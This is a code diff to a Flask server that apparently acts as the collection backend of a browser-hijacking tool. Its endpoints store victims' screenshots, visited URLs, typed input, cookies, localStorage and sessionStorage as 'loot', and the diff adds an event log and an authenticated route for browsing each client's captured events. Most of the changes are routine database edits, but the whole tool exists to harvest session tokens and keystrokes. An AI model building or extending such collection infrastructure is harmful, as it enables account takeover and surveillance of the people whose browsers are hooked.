@@ -179,9 +179,9 @@ class SessionStorage(db.Model):
 
 class Event(db.Model):
     id        = db.Column(db.Integer, primary_key=True)
-    clientID  = db.Column(db.string(100), nullable=False)
+    clientID  = db.Column(db.String(100), nullable=False)
     timeStamp = db.Column(db.DateTime(timezone=True))
-    eventType = db.Column(db.string(100), nullable=False)
+    eventType = db.Column(db.String(100), nullable=False)
     eventID   = db.Column(db.Integer, nullable=False)
 
     def __repr__(self):
@@ -444,6 +444,14 @@ def recordScreenshot(identifier):
     clientSeen(identifier)
     dbCommit()
 
+    # add to global event table
+    db.session.refresh(newScreenshot)
+    newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
+    eventType='SCREENSHOT', eventID=newScreenshot.id)
+    db.session.add(newEvent)
+    dbCommit()
+
+
 
     return "ok", 200
 
@@ -473,10 +481,19 @@ def recordHTML(identifier):
 
 
     # Put it in the DB
-    newHtml = HtmlCode(clientID=identifier, url=content['url'], code=content['html'])
+    newHtml = HtmlCode(clientID=identifier, url=content['url'], 
+        code=content['html'])
     db.session.add(newHtml)
     clientSeen(identifier)
     dbCommit()
+
+    # add to global event table
+    db.session.refresh(newHtml)
+    newEvent = Event(clientID=identifier, timeStamp=newHtml.timeStamp, 
+        eventType='HTML', eventID=newHtml.id)
+    db.session.add(newEvent)
+    dbCommit()
+
 
     return "ok", 200
 
@@ -498,6 +515,13 @@ def recordUrl(identifier):
     newUrl = UrlVisited(clientID=identifier, url=content['url'])
     db.session.add(newUrl)
     clientSeen(identifier)
+    dbCommit()
+
+    # add to global event table
+    db.session.refresh(newUrl)
+    newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
+    eventType='URLVISITED', eventID=newUrl.id)
+    db.session.add(newEvent)
     dbCommit()
 
     return "ok", 200
@@ -523,6 +547,13 @@ def recordInput(identifier):
     clientSeen(identifier)
     dbCommit()
 
+    # add to global event table
+    db.session.refresh(newInput)
+    newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
+    eventType='USERINPUT', eventID=newInput.id)
+    db.session.add(newEvent)
+    dbCommit()    
+
     return "ok", 200
 
 
@@ -547,6 +578,12 @@ def recordCookie(identifier):
     clientSeen(identifier)
     dbCommit()
 
+    # add to global event table
+    db.session.refresh(newCookie)
+    newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
+    eventType='COOKIE', eventID=newCookie.id)
+    db.session.add(newEvent)
+    dbCommit()    
 
     return "ok", 200
 
@@ -569,6 +606,13 @@ def recordLocalStorageEntry(identifier):
     clientSeen(identifier)
     dbCommit()
 
+    # add to global event table
+    db.session.refresh(newLocalStorage)
+    newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
+    eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
+    db.session.add(newEvent)
+    dbCommit()    
+
     return "ok", 200
 
 
@@ -589,6 +633,13 @@ def recordSessionStorageEntry(identifier):
     clientSeen(identifier)
     dbCommit()
 
+
+    # add to global event table
+    db.session.refresh(newSessionStorage)
+    newEvent = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
+    eventType='SESSIONSTORAGE', eventID=newSessionStorage.id)
+    db.session.add(newEvent)
+    dbCommit()    
 
     return "ok", 200
 
@@ -612,6 +663,21 @@ def getClients():
 
 
 
+@app.route('/api/clientEvents/<id>', methods=['GET'])
+@login_required
+def getClientEvents(id):
+    print("Retrieving events table for client: " + id)
+    client = Client.query.filter_by(id=id).first()
+    clientName = client.nickname;
+
+    events = Event.query.filter_by(clientID=clientName)
+
+    eventData = [{'id':event.id, 'timeStamp':event.timeStamp, 
+        'eventType':event.eventType, 'eventID':event.eventID} for event in events]
+
+    return jsonify(eventData)
+
+    
 
 @app.route('/api/clientScreenshots/<id>', methods=['GET'])
 @login_required
@@ -844,8 +910,11 @@ if __name__ == '__main__':
             db.drop_all()
             db.create_all()
             shutil.rmtree("./loot")
+            addAdminUser()
 
 
+    with app.app_context():
+        db.session.configure(autoflush=False)
 
 
     # Check for loot directory
